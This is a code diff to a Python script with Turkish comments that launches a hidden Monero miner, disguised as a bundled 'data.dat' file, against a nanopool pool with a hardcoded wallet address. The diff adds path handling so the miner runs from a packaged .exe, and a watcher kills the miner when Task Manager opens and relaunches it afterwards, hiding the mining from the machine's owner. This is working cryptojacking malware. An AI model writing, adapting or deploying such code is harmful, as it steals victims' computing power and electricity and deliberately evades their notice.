@@ -3,15 +3,22 @@ import subprocess
 import psutil
 import time
 import threading    
+import sys
 
 def enject():
     with open("chcekdata", "w") as f:
         f.write("True")
 
-
+def dosya_yolu(dosya_adı):
+    """Dosyanın .exe içinde veya normal çalışmada doğru konumunu döndürür."""
+    if getattr(sys, 'frozen', False):  # Eğer exe olarak çalışıyorsa
+        return os.path.join(sys._MEIPASS, dosya_adı)
+    else:  # Python dosyası olarak çalışıyorsa
+        return os.path.join(os.path.dirname(__file__), dosya_adı)
+data = dosya_yolu("data.dat")
 def start():
 
-    subprocess.Popen("cmd.exe /c start /B data.dat -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(f"cmd.exe /c start /B {data} -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 def kill():
@@ -46,7 +53,7 @@ def task_manager_watcher():
             print("Görev Yöneticisi Açıldı!")
             kill()
         elif not ifapp():
-            subprocess.Popen("cmd.exe /c start /B data.dat -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(f"cmd.exe /c start /B {data} -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
 
 
